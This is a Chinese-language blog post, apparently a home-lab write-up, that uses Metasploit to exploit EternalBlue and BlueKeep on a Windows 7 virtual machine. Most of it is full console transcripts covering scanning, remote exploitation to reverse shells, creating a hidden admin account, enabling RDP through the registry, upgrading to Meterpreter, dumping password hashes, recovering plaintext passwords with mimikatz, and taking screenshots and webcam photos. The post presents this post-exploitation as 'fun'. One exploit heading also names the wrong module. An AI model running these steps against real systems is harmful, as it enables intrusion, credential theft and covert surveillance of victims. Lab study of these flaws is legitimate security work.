---
title: Have Fun with Metasploit-Framework
date: 2019-09-16 16:51:20
tags: [cve, kali]
---

使用 Metasploit-Framework 复现 EternalBlue 以及 BlueKeep。

<!-- more -->

# Metasploit-Framework

Metasploit 项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。其最为知名的子项目是开源的 Metasploit 框架，一套针对远程主机进行开发和执行“exploit 代码”的工具。其他重要的子项目包括 Opcode 数据库、shellcode 档案、安全研究等内容。

在本实验中使用 Kali Linux 下的 Metasploit Framework。

# Environment

- VMware Fusion：专业版 11.1.0
- LHOST：Kali Rolling (2019.2) x64（IP：192.168.1.109）
- RHOST：Windows 7 SP1 旗舰版 (64 位)（IP：192.168.1.102）

# EternalBlue

## Intro

[永恒之蓝](https://en.wikipedia.org/wiki/EternalBlue)是美国国家安全局开发的漏洞利用程序，于 2017 年 4 月 14 日被黑客组织影子掮客泄漏。该工具利用 **445/TCP** 端口的档案分享协议的漏洞进行散播。尽管微软于 2017 年 3 月 14 日已经发布过 Microsoft Windows 补丁修补了这个漏洞，然而在 5 月 12 日 WannaCry 勒索软体利用这个漏洞传播时，很多用户仍然因为没有安装补丁而受害。由于 WannaCry 的严重性，微软于 2017 年 5 月 13 日为已超过支持周期的 Microsoft Windows XP、Microsoft Windows 8 和 Windows Server 2003 发布了紧急安全更新，以阻止其散布造成更大的危害。

下面通过 Metasploit Framework 对 EternalBlue 进行利用。

## Scan

先使用 `auxiliary/scanner/smb/smb_ms17_010` 模块对靶机进行扫描：

```
msf5 > use auxiliary/scanner/smb/smb_ms17_010
msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.1.102
rhosts => 192.168.1.102
msf5 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       192.168.1.102                                                   yes       The target address range or CIDR identifier
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.1.102:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.102:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Exploit

确定存在漏洞后使用 `exploit/windows/smb/ms17_010_eternalblue` 模块攻击，并得到 CMD Shell：

```
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.1.102
rhosts => 192.168.1.102
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.1.102    yes       The target address range or CIDR identifier
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.109:4444
[+] 192.168.1.102:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.102:445 - Connecting to target for exploitation.
[+] 192.168.1.102:445 - Connection established for exploitation.
[+] 192.168.1.102:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.102:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.1.102:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.1.102:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service
[*] 192.168.1.102:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1
[+] 192.168.1.102:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.102:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.102:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.102:445 - Starting non-paged pool grooming
[+] 192.168.1.102:445 - Sending SMBv2 buffers
[+] 192.168.1.102:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.102:445 - Sending final SMBv2 buffers.
[*] 192.168.1.102:445 - Sending last fragment of exploit packet!
[*] 192.168.1.102:445 - Receiving response from exploit packet
[+] 192.168.1.102:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.102:445 - Sending egg to corrupted connection.
[*] 192.168.1.102:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (192.168.1.109:4444 -> 192.168.1.102:49161) at 2019-09-17 02:41:44 -0400
[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=



C:\Windows\system32>
```

# BlueKeep

## Intro

[BlueKeep](https://en.wikipedia.org/wiki/BlueKeep)（CVE-2019-0708）是 Microsoft 远程桌面协议实现中发现的一个安全漏洞，它允许远程执行代码。首次报告于 2019 年 5 月，它存在于从 Windows 2000 到 Windows Server 2008 R2 和 Windows 7 的所有未修补的基于 Windows NT 的 Microsoft Windows 版本中。Microsoft 发布了一个安全补丁（包括几个版本的带外更新） 在 2019 年 5 月 14 日，已经达到其寿命结束的 Windows，例如 Windows XP。在 2019 年 8 月 13 日，据报道，相关的 BlueKeep 安全漏洞（统称为 DejaBlue）会影响较新的 Windows 版本，包括 Windows 7 和所有最新版本 高达 Windows 10 的操作系统，以及较旧的 Windows 版本。2019 年 9 月 6 日，Metasploit 利用可疑的 BlueKeep 安全漏洞宣布已经发布到公共领域。

下面通过 Metasploit Framework 对 BlueKeep 进行利用，具体脚本来自 [Github](https://github.com/NAXG/cve_2019_0708_bluekeep_rce)。

## Scan

先使用 `auxiliary/scanner/rdp/cve_2019_0708_bluekeep` 模块对靶机进行扫描：

```
msf5 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set rhosts 192.168.1.102
rhosts => 192.168.1.102
msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > show options

Module options (auxiliary/scanner/rdp/cve_2019_0708_bluekeep):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET = random
   RDP_DOMAIN                        no        The client domain name to report during connect
   RDP_USER                          no        The username to report during connect, UNSET = random
   RHOSTS           192.168.1.102    yes       The target address range or CIDR identifier
   RPORT            3389             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads


Auxiliary action:

   Name  Description
   ----  -----------
   Scan  Scan for exploitable targets


msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run

[*] 192.168.1.102:3389    - Detected RDP on 192.168.1.102:3389    (Windows version: 6.1.7601) (Requires NLA: No)
[+] 192.168.1.102:3389    - The target is vulnerable.
[*] 192.168.1.102:3389    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Exploit

确定存在漏洞后使用 `exploit/windows/smb/ms17_010_eternalblue` 模块攻击，并得到 CMD Shell：

```
msf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rhosts 192.168.1.102
rhosts => 192.168.1.102
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 3
target => 3
msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show options

Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random
   RDP_DOMAIN                        no        The client domain name to report during connect
   RDP_USER                          no        The username to report during connect, UNSET = random
   RHOSTS           192.168.1.102    yes       The target address range or CIDR identifier
   RPORT            3389             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)


msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit

[*] Started reverse TCP handler on 192.168.1.109:4444
[*] 192.168.1.102:3389    - Detected RDP on 192.168.1.102:3389    (Windows version: 6.1.7601) (Requires NLA: No)
[+] 192.168.1.102:3389    - The target is vulnerable.
[*] 192.168.1.102:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028600000, Channel count 1.
[*] 192.168.1.102:3389 - Surfing channels ...
[*] 192.168.1.102:3389 - Lobbing eggs ...
[*] 192.168.1.102:3389 - Forcing the USE of FREE'd object ...
[*] Command shell session 2 opened (192.168.1.109:4444 -> 192.168.1.102:49162) at 2019-09-17 02:47:40 -0400



C:\Windows\system32>
```

# Post Exploitation

在获取到 CMD Shell 之后可以做更多好玩的事情，比如使用 Meterpreter 进行后渗透等等，这里只记录一部分。

## 新建用户并进行远程连接

在得到一个 CMD Shell 后，可以新建一个用户并加入管理员组：

```cmd
C:\Windows\system32>net user hacker hacker /add
net user hacker hacker /add
����ɹ���ɡ�


C:\Windows\system32>net localgroup administrators hacker /add
net localgroup administrators hacker /add
����ɹ���ɡ�
```

开启远程连接：

```cmd
C:\Windows\system32>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
����ɹ���ɡ�
```

然后使用 Kali 下的远程桌面进行连接，使用新创建的用户 hacker 登录：

```bash
rdesktop 192.168.1.102:3389
# rdesktop 192.168.1.102 -u hacker -p hacker
```

![](/pics/Have-Fun-with-Metasploit-Framework/1.png)

## 将普通的 CMD Shell 升级为 Meterpreter

原本的 CMD Shell 可以做的事情有限，使用 sessions 命令升级到 Meterpreter 可以做更多好玩的事。

```
msf5 > sessions

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  1         shell x64/windows  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -> 192.168.1.102:49161 (192.168.1.102)
  2         shell x64/windows  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -> 192.168.1.102:49162 (192.168.1.102)

msf5 > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.1.109:4433
msf5 >
[*] Sending stage (179779 bytes) to 192.168.1.102
[*] Meterpreter session 3 opened (192.168.1.109:4433 -> 192.168.1.102:49163) at 2019-09-17 02:55:12 -0400
[*] Stopping exploit/multi/handler

msf5 > sessions

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -> 192.168.1.102:49161 (192.168.1.102)
  2         shell x64/windows        Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -> 192.168.1.102:49162 (192.168.1.102)
  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-Q595JS8OROC                                             192.168.1.109:4433 -> 192.168.1.102:49163 (192.168.1.102)
```

多了一个 session 3，打开后得到 Meterpreter 的 Shell：

```
msf5 > sessions 3
[*] Starting interaction with 3...

meterpreter >
```

然后可以看到得到的 Meterpreter 是 32 位的，可以通过把它绑定到某个 64 位的程序（所属用户为 SYSTEM）来修改成 64 位：

```
meterpreter > sysinfo
Computer        : WIN-Q1ST6EBNLTR
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > ps

Process List
============

 PID   PPID  Name                    Arch  Session  User                          Path
 ---   ----  ----                    ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                  x64   0
 100   780   audiodg.exe             x64   0
 268   4     smss.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 352   344   csrss.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 404   344   wininit.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 416   396   csrss.exe               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 420   2584  mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe
 464   396   winlogon.exe            x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 512   404   services.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 520   404   lsass.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 528   404   lsm.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 572   512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE
 632   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM
 696   512   vmacthlp.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 728   512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE
 780   512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE
 896   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM
 960   2584  mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe
 964   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM
 1096  512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE
 1192  512   spoolsv.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1228  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE
 1240  512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM
 1300  512   msdtc.exe               x64   0        NT AUTHORITY\NETWORK SERVICE
 1440  512   VGAuthService.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1464  512   vmtoolsd.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1624  512   sppsvc.exe              x64   0        NT AUTHORITY\NETWORK SERVICE
 1704  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE
 1744  512   mscorsvw.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe
 1768  512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE
 1836  352   conhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 1844  512   dllhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dllhost.exe
 1860  632   WmiPrvSE.exe
 1984  512   dllhost.exe             x64   0        NT AUTHORITY\SYSTEM
 2000  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE
 2084  512   VSSVC.exe               x64   0        NT AUTHORITY\SYSTEM
 2116  2424  cmd.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2192  2116  powershell.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2228  632   WmiPrvSE.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 2320  512   taskhost.exe            x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\taskhost.exe
 2368  352   conhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2392  896   dwm.exe                 x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\dwm.exe
 2404  2384  explorer.exe            x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\explorer.exe
 2424  1192  cmd.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2516  512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM
 2548  512   WmiApSrv.exe            x64   0        NT AUTHORITY\SYSTEM
 2584  512   mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe
 2756  512   SearchIndexer.exe       x64   0        NT AUTHORITY\SYSTEM
 2852  2756  SearchFilterHost.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchFilterHost.exe
 2888  2756  SearchProtocolHost.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchProtocolHost.exe
 2968  2404  cmd.exe                 x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\cmd.exe
 2976  416   conhost.exe             x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\conhost.exe
 3060  3020  powershell.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe

meterpreter > migrate 2368
[*] Migrating from 3060 to 2368...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : WIN-Q1ST6EBNLTR
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 获取用户密码

利用 hashdump 可以获得所有用户密码的哈希值：

```
meterpreter > run hashdump

[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY a648199744904bf08ff1b92b5b224011...
/usr/share/metasploit-framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
/usr/share/metasploit-framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
/usr/share/metasploit-framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
/usr/share/metasploit-framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
victim:1000:aad3b435b51404eeaad3b435b51404ee:3008c87294511142799dca1191e69a0f:::
hacker:1001:aad3b435b51404eeaad3b435b51404ee:5e7599f673df11d5c5c4d950f5bf0157:::
```

使用神器 mimikatz 有可能能得到密码的明文：

```
meterpreter > load mimikatz
Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
Success.
meterpreter > wdigest
[+] Running as SYSTEM
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain           User              Password
------    -------    ------           ----              --------
0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE
0;996     Negotiate  WORKGROUP        WIN-Q1ST6EBNLTR$
0;52252   NTLM
0;999     NTLM       WORKGROUP        WIN-Q1ST6EBNLTR$
0;333800  NTLM       WIN-Q1ST6EBNLTR  victim            admin123
0;333754  NTLM       WIN-Q1ST6EBNLTR  victim            admin123
```

### 截取屏幕

使用 screenshot 可以截取桌面实时图片：

```
meterpreter > screenshot
Screenshot saved to: /root/NjEXrhqY.jpeg
```

![](/pics/Have-Fun-with-Metasploit-Framework/2.png)

### 用摄像头拍照

使用 webcam 系列命令可以用摄像头拍照：

```
meterpreter > webcam_list
1: VMware Virtual USB Video Device
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/jkhYoacC.jpeg
```

![](/pics/Have-Fun-with-Metasploit-Framework/3.png)

# References

https://blog.51cto.com/chenxinjie/2092754
https://mp.weixin.qq.com/s/swR4LjNJgHsx2VetyM6G5Q
https://www.anquanke.com/post/id/164525
https://zhuanlan.zhihu.com/p/25857679
https://xz.aliyun.com/t/2536
http://hardsec.net/mimikatz-meterpreter-extension/?lang=en
